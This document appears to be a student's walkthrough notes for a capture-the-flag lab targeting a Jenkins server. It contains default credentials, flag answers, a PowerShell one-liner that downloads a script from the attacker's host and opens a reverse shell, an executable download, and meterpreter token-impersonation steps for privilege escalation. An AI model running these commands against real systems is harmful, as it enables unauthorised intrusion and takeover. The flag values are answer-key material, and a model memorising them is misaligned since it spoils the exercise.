# Alfred Jenkins Exploit
---

___

# My IP

> 10.8.19.163

___

# Target IP

> 10.10.132.173
___

# NMAP Scan

> "nmap -Pn -n -p- -sC -sV -T5 10.10.132.173 | tee alfred.nmap"

1. How many ports are open?
,,,
3
,,,

2. What is the username and password for the log in panel(in the format username:password)?
,,,
> admin:admin
,,,

> uoloading files under config.

3. What is the user.txt flag?
,,,
> 79007a09481963edf2e1321abd9ae2a0
,,,

# Switching shells

1. What is the final size of the exe payload that was created.
,,,
73802
,,,

powershell iex (New-Object Net.WebClient).DownloadString('http://10.8.19.163:8002/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.8.19.163 -Port 1235

powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.19.163:8003/alfred2.exe','alfred2.exe')"

# Privilege Escalation

Successful reverse tcp shell with meterpreter in metasploit. 

> Used msfvenom to create a malware to start a connection.
>
> Used "Start-Process alfred2.exe"
>
> Escalated privileges by loading incognito in meterpreter "load incognito" then "list_tokens -g". Shows available user groups.
>
> Performed impersonation with "impersonate_token "BUILTIN\Administrators"".

1. read the root.txt file at C:\Windows\System32\config
,,,
dff0f748678f280250f25a45b8046b4a
,,,